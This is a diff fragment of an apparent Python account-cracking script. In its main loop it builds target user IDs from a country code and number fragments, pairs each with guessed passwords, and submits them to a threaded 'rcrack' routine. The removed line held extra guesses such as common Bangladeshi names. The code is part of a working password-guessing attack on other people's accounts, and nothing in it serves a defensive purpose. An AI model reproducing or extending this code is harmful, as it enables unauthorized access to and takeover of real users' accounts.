@@ -227,7 +227,7 @@ def RJ_SN():
         print('\033[1;92mIF ID NOT COME TURN ON AIRPLNE')
         linex()
         for love in user:
-            pwx = [love[2:],love,code+love,code+love[:3],'jannat','sumaiya','sadiya','mehedi','sabbir','bangladesh','bangla']
+            pwx = [love[2:],love,code+love,code+love[:3],]
             uid = code+love
             manshera.submit(rcrack,uid,pwx,tl)
     print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;90mCRACK PROCESS HAS BEEN COMPLETED ')
